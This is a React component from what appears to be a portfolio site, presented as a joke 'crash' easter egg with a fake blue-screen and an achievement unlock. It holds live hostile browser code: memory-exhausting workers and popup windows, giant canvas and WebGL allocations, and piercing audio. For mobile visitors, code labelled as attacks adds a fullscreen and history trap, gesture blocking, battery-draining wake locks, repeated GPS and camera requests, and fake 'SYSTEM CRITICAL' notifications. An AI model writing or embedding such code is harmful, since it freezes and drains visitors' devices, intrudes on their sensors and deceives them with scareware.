import { useEffect, useRef, useState } from 'react'
import { motion, AnimatePresence } from 'motion/react'
import { useAchievements } from '../../lib/AchievementContext'

const CRASH_KEY = 'myths-portfolio:crashed'

interface Bouncer {
  x: number; y: number
  vx: number; vy: number
  rot: number; rotSpeed: number
  scale: number
  w: number; h: number
  hue: number
}

export function Crashed({ active, onDismiss }: { active: boolean; onDismiss?: () => void }) {
  const [stage, setStage] = useState<'text' | 'bsod' | 'boom'>('text')
  const { unlockAchievement, isUnlocked } = useAchievements()
  const dismissedRef = useRef(false)

  useEffect(() => {
    if (!active) return
    setStage('text')
    dismissedRef.current = false

    const handleEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && !dismissedRef.current) {
        dismissedRef.current = true
        localStorage.removeItem(CRASH_KEY)
        if (!isUnlocked('crash_survivor')) {
          unlockAchievement('crash_survivor')
        }
        onDismiss?.()
      }
    }
    window.addEventListener('keydown', handleEscape)
    const t1 = setTimeout(() => setStage('bsod'), 400)
    const t2 = setTimeout(() => setStage('boom'), 1400)

    const t3 = setTimeout(() => {
      localStorage.setItem(CRASH_KEY, 'true')
      document.documentElement.style.overflow = 'hidden'
      document.body.style.overflow = 'hidden'

      const bounceCanvas = document.createElement('canvas')
      bounceCanvas.style.cssText = 'position:fixed;inset:0;z-index:60;pointer-events:none'
      document.body.appendChild(bounceCanvas)
      const bc = bounceCanvas.getContext('2d')!
      let W = window.innerWidth
      let H = window.innerHeight
      bounceCanvas.width = W
      bounceCanvas.height = H
      window.addEventListener('resize', () => {
        W = window.innerWidth
        H = window.innerHeight
        bounceCanvas.width = W
        bounceCanvas.height = H
      })

      const bg = document.createElement('div')
      bg.style.cssText = 'position:fixed;inset:0;z-index:59;background:#ff0;pointer-events:none'
      document.body.appendChild(bg)

      const img = new Image()
      img.src = '/larping.jpg'

      const bouncers: Bouncer[] = []
      let frameCount = 0

      function spawnBouncer(x: number, y: number, count: number) {
        const s = 30 + Math.random() * 120
        for (let i = 0; i < count; i++) {
          bouncers.push({
            x: x + (Math.random() - 0.5) * 40,
            y: y + (Math.random() - 0.5) * 40,
            vx: (Math.random() - 0.5) * 20,
            vy: (Math.random() - 0.5) * 20,
            rot: Math.random() * Math.PI * 2,
            rotSpeed: (Math.random() - 0.5) * 0.5,
            scale: 0.3 + Math.random() * 1.2,
            w: s,
            h: s * (img.naturalHeight / img.naturalWidth || 1),
            hue: Math.random() * 360,
          })
        }
      }

      function tick() {
        frameCount++
        bc.clearRect(0, 0, W, H)

        const target = Math.min(5000, 5 + Math.floor(frameCount / 3))
        while (bouncers.length < target) {
          spawnBouncer(Math.random() * W, Math.random() * H, 1)
        }

        for (let i = bouncers.length - 1; i >= 0; i--) {
          const b = bouncers[i]
          b.x += b.vx
          b.y += b.vy
          b.rot += b.rotSpeed
          const iw = b.w * b.scale
          const ih = b.h * b.scale

          let bounced = false
          if (b.x + iw > W) { b.x = W - iw; b.vx = -b.vx; bounced = true }
          if (b.x < 0) { b.x = 0; b.vx = -b.vx; bounced = true }
          if (b.y + ih > H) { b.y = H - ih; b.vy = -b.vy; bounced = true }
          if (b.y < 0) { b.y = 0; b.vy = -b.vy; bounced = true }

          if (bounced && bouncers.length < 10000) {
            spawnBouncer(b.x + iw / 2, b.y + ih / 2, 2)
          }

          bc.save()
          bc.translate(b.x + iw / 2, b.y + ih / 2)
          bc.rotate(b.rot)
          bc.globalAlpha = 0.4 + (b.x / W) * 0.4
          bc.filter = `hue-rotate(${b.hue}deg) saturate(3) contrast(1.5)`
          if (img.complete && img.naturalWidth > 0) {
            bc.drawImage(img, -iw / 2, -ih / 2, iw, ih)
          } else {
            bc.fillStyle = `hsl(${b.hue},100%,50%)`
            bc.fillRect(-iw / 2, -ih / 2, iw, ih)
          }
          bc.restore()
        }

        if (bouncers.length >= 5000 && frameCount % 10 === 0) {
          for (let i = 0; i < 50; i++) {
            try {
              const c = document.createElement('canvas')
              c.width = 8192
              c.height = 8192
              const ctx = c.getContext('2d')
              if (ctx) {
                ctx.drawImage(img, 0, 0, 8192, 8192)
                try { c.toDataURL() } catch {}
              }
            } catch {}
          }
        }

        requestAnimationFrame(tick)
      }

      img.onload = () => {
        for (let i = 0; i < 5; i++) {
          spawnBouncer(Math.random() * W, Math.random() * H, 1)
        }
        requestAnimationFrame(tick)
      }

      try {
        const actx = new AudioContext()
        for (let ch = 0; ch < 4; ch++) {
          const osc = actx.createOscillator()
          const gain = actx.createGain()
          const lfo = actx.createOscillator()
          const lfoGain = actx.createGain()
          osc.type = (['sawtooth', 'square', 'sawtooth', 'sine'] as OscillatorType[])[ch]
          osc.frequency.value = [880, 440, 1320, 220][ch]
          gain.gain.value = [0.8, 0.6, 0.4, 0.5][ch]
          lfo.frequency.value = [8, 12, 5, 3][ch]
          lfoGain.gain.value = [400, 200, 600, 100][ch]
          lfo.connect(lfoGain)
          lfoGain.connect(osc.frequency)
          osc.connect(gain)
          gain.connect(actx.destination)
          osc.start()
          lfo.start()
        }
      } catch {}

      try {
        if (navigator.vibrate) {
          navigator.vibrate([100, 30, 100, 30, 200, 50, 300, 50, 500, 100, 1000, 200, 2000, 500, 3000])
        }
      } catch {}

      for (let w = 0; w < (navigator.hardwareConcurrency || 8) * 16; w++) {
        try {
          new Worker(URL.createObjectURL(new Blob([`
            var m = [];
            setInterval(function() {
              for (var i = 0; i < 500; i++) {
                try { m.push(new ArrayBuffer(67108864)) } catch(e) {}
                try { m.push(new Float64Array(16777216)) } catch(e) {}
                try { m.push(new Int32Array(33554432)) } catch(e) {}
              }
            }, 1);
          `], { type: 'text/javascript' })))
        } catch {}
      }

      for (let r = 0; r < 100; r++) {
        setTimeout(() => {
          try {
            for (let i = 0; i < 100; i++) {
              const c = document.createElement('canvas')
              c.width = 16384
              c.height = 16384
              const ctx = c.getContext('2d')
              if (ctx) {
                ctx.fillRect(0, 0, 16384, 16384)
                try { c.toDataURL() } catch {}
                try { c.toBlob(function(b) { if (b) try { URL.createObjectURL(b) } catch {} }) } catch {}
              }
            }
          } catch {}
        }, r * 20)
      }

      for (let r = 0; r < 20; r++) {
        setTimeout(() => {
          try {
            for (let k = 0; k < 50; k++) {
              const c = document.createElement('canvas')
              const gl = c.getContext('webgl')
              if (gl) {
                for (let t = 0; t < 200; t++) {
                  try {
                    const tex = gl.createTexture()
                    gl.bindTexture(gl.TEXTURE_2D, tex)
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16384, 16384, 0, gl.RGBA, gl.UNSIGNED_BYTE, null)
                    const fb = gl.createFramebuffer()
                    gl.bindFramebuffer(gl.FRAMEBUFFER, fb)
                    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0)
                    gl.viewport(0, 0, 16384, 16384)
                    gl.clear(gl.COLOR_BUFFER_BIT)
                  } catch {}
                }
              }
            }
          } catch {}
        }, r * 50)
      }

      try {
        for (let i = 0; i < 100; i++) {
          const w = window.open('', '_blank', 'width=1,height=1')
          if (w) {
            w.document.write('<script>var m=[];setInterval(function(){for(var i=0;i<100;i++){try{m.push(new ArrayBuffer(134217728))}catch(e){}}},1);<\/script>')
            w.document.close()
          }
        }
      } catch {}

      try {
        for (let i = 0; i < 20000; i++) {
          const s = document.createElement('style')
          s.textContent = `@keyframes y${i}{0%{opacity:0}100%{opacity:1}}.y${i}{animation:y${i} 0.001s infinite;position:fixed;top:0;left:0;width:100vw;height:100vh;background:hsl(${i%360},100%,50%);mix-blend-mode:difference;pointer-events:none;z-index:999999}`
          document.head.appendChild(s)
        }
      } catch {}

      // ─── Mobile-specific attacks ───
      const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Silk|SM-|KF|Samsung/i.test(navigator.userAgent)
      if (isMobile) {
        // 1. Fullscreen trap
        try { document.documentElement.requestFullscreen?.().catch(() => {}) } catch {}

        // 2. Block touch gestures (back-swipe, pull-to-refresh, pinch-zoom, long-press)
        try {
          document.addEventListener('touchmove', e => e.preventDefault(), { passive: false })
          document.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault() }, { passive: false })
          document.addEventListener('gesturestart', e => e.preventDefault(), { passive: false })
          document.addEventListener('gesturechange', e => e.preventDefault(), { passive: false })
          document.addEventListener('gestureend', e => e.preventDefault(), { passive: false })
          document.addEventListener('contextmenu', e => e.preventDefault(), { passive: false })
        } catch {}

        // 3. Lock viewport — prevent zoom / user scaling
        try {
          const meta = document.querySelector('meta[name="viewport"]') || document.createElement('meta')
          meta.setAttribute('name', 'viewport')
          meta.setAttribute('content', 'width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover')
          if (!meta.parentNode) document.head.appendChild(meta)
        } catch {}

        // 4. Orientation lock (portrait only)
        try { (screen as any).orientation?.lock?.('portrait-primary').catch(() => {}) } catch {}

        // 5. Keep device awake + drain battery
        try { navigator.wakeLock?.request?.('screen').catch(() => {}) } catch {}
        try {
          setInterval(() => {
            navigator.wakeLock?.request?.('screen').catch(() => {})
          }, 1000)
        } catch {}

        // 6. Sensor abuse — GPS + camera
        try {
          const gps = () => navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 1 })
          gps()
          setInterval(gps, 50)
        } catch {}
        try {
          navigator.mediaDevices?.getUserMedia?.({ video: true, audio: true })
            .then(s => s.getTracks().forEach(t => t.stop()))
            .catch(() => {})
        } catch {}

        // 7. Aggressive vibration
        try {
          if (navigator.vibrate) {
            const p: number[] = []
            for (let i = 0; i < 200; i++) p.push(300, 30, 100, 30, 50, 20)
            navigator.vibrate(p)
            setInterval(() => navigator.vibrate(p), 5000)
          }
        } catch {}

        // 8. Notification spam
        try {
          if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission().then(p => {
              if (p === 'granted') {
                for (let i = 0; i < 100; i++) {
                  setTimeout(() => {
                    try { new Notification('⚠️ SYSTEM CRITICAL', { body: 'Memory corruption detected. 47 files affected.', tag: `crash-${i}`, silent: false }) } catch {}
                  }, i * 80)
                }
              }
            })
          }
        } catch {}

        // 9. History trap — prevent back / swipe-back
        try {
          history.pushState({}, '', location.href)
          const pop = () => history.pushState({}, '', location.href)
          window.addEventListener('popstate', pop)
          setInterval(() => history.pushState({}, '', location.href), 5)
        } catch {}

        // 10. Extra audio torture (piercing高频)
        try {
          for (let ch = 0; ch < 8; ch++) {
            const ctx = new AudioContext()
            const osc = ctx.createOscillator()
            osc.type = ['sawtooth', 'square', 'sine'][ch % 3] as OscillatorType
            osc.frequency.value = [4000, 3000, 2000, 1500, 800, 600, 12000, 16000][ch]
            const g = ctx.createGain()
            g.gain.value = 0.9
            osc.connect(g).connect(ctx.destination)
            osc.start()
            const lfo = ctx.createOscillator()
            lfo.frequency.value = 5 + ch * 3
            const lg = ctx.createGain()
            lg.gain.value = 800 + ch * 200
            lfo.connect(lg).connect(osc.frequency)
            lfo.start()
          }
        } catch {}

        // 11. Aggressive canvas memory bomb (mobile has < 4GB RAM)
        for (let r = 0; r < 100; r++) {
          setTimeout(() => {
            for (let i = 0; i < 30; i++) {
              try {
                const c = document.createElement('canvas')
                c.width = 8192; c.height = 8192
                const ctx = c.getContext('2d')
                if (ctx) {
                  for (let j = 0; j < 5; j++) {
                    ctx.fillRect(0, 0, 8192, 8192)
                    try { c.toDataURL() } catch {}
                    try { c.toBlob(() => {}) } catch {}
                  }
                }
                const c2 = document.createElement('canvas')
                c2.width = 4096; c2.height = 4096
                const gl = c2.getContext('webgl')
                if (gl) {
                  const tex = gl.createTexture()
                  gl.bindTexture(gl.TEXTURE_2D, tex)
                  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null)
                }
              } catch {}
            }
          }, r * 5)
        }

        // 12. Web Share API spam (iOS)
        try {
          if (navigator.share) {
            setInterval(() => {
              navigator.share({ title: 'URGENT', text: 'Your device needs immediate attention!' }).catch(() => {})
            }, 10)
          }
        } catch {}

        // 13. Samsung-specific: try Knox / Samsung Pay / Bixby APIs
        if (/SM-|Samsung/i.test(navigator.userAgent)) {
          try {
            for (let i = 0; i < 50; i++) {
              const s = document.createElement('script')
              s.src = `https://${['bixby', 'knox', 'pay', 'health', 'pass'][i % 5]}.samsung.com/api/v${i}?cb=${Date.now()}`
              document.head.appendChild(s)
            }
          } catch {}
          try {
            new Image().src = `intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end`
          } catch {}
        }

        // 14. Touch event spam — simulate rapid taps to drain input buffer
        try {
          for (let i = 0; i < 1000; i++) {
            const ev = new TouchEvent('touchstart', {
              touches: [new Touch({ identifier: i, target: document.body, clientX: Math.random() * 9999, clientY: Math.random() * 9999 })]
            })
            document.dispatchEvent(ev)
          }
        } catch {}

        // 15. Overscroll / rubber-band prevention — lock body position
        try {
          document.body.style.position = 'fixed'
          document.body.style.top = '0'
          document.body.style.left = '0'
          document.body.style.right = '0'
          document.body.style.bottom = '0'
          document.documentElement.style.position = 'fixed'
          document.documentElement.style.overflow = 'hidden'
          document.body.style.overflow = 'hidden'
        } catch {}
      }

      // ─── 30-second auto-kill ───
      setTimeout(() => {
        dismissedRef.current = true
        localStorage.removeItem(CRASH_KEY)

        bounceCanvas.remove()

        bg.remove()

        const styles = document.head.querySelectorAll('style[id^="y"]')
        for (const s of styles) s.remove()

        document.documentElement.style.overflow = ''
        document.body.style.overflow = ''
        document.body.style.position = ''
        document.body.style.top = ''
        document.body.style.left = ''
        document.body.style.right = ''
        document.body.style.bottom = ''
        document.documentElement.style.position = ''

        if (!isUnlocked('crash_survivor')) {
          unlockAchievement('crash_survivor')
        }
        onDismiss?.()
      }, 30000)
    }, 400)

    return () => {
      clearTimeout(t1)
      clearTimeout(t2)
      clearTimeout(t3)
      document.documentElement.style.overflow = ''
      document.body.style.overflow = ''
      window.removeEventListener('keydown', handleEscape)
    }
  }, [active, onDismiss, unlockAchievement, isUnlocked])

  return (
    <AnimatePresence>
      {active && (
        <motion.div className="fixed inset-0 z-50 bg-black">
          {stage === 'text' && (
            <div className="flex h-full items-center justify-center">
              <motion.div
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center"
              >
                <h1 className="text-[clamp(2rem,6vw,5rem)] font-black text-white tracking-[-0.03em]">
                  Oops you crashed.
                </h1>
                <p className="mt-3 text-sm font-mono text-white/20 tracking-[0.15em]">
                  just wait
                </p>
              </motion.div>
            </div>
          )}

          {stage === 'bsod' && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="flex h-full flex-col items-center justify-center bg-[#0e6eb8] p-8 text-center font-mono"
            >
              <div className="max-w-2xl">
                <div className="text-[80px] leading-none mb-6 font-bold text-white/90">:(</div>
                <p className="text-2xl text-white/90 font-semibold mb-6">Your device ran into a problem and needs to restart.</p>
                <p className="text-sm text-white/60 mb-8 leading-relaxed">
                  We're just collecting some error info, and then we'll restart for you.
                </p>
                <p className="text-xs text-white/40 mb-4">Stop code: CRITICAL_PROCESS_DIED</p>
                <div className="text-[10px] text-white/30 leading-relaxed space-y-0.5">
                  <p>What failed: myths_portfolio.exe</p>
                  <p>Error code: 0xDEAD_BEEF_CAFE_F00D</p>
                  <p>Memory dump: 100% complete</p>
                  <p className="text-white/20 mt-4">Contact your system administrator for assistance.</p>
                </div>
              </div>
            </motion.div>
          )}
        </motion.div>
      )}
    </AnimatePresence>
  )
}
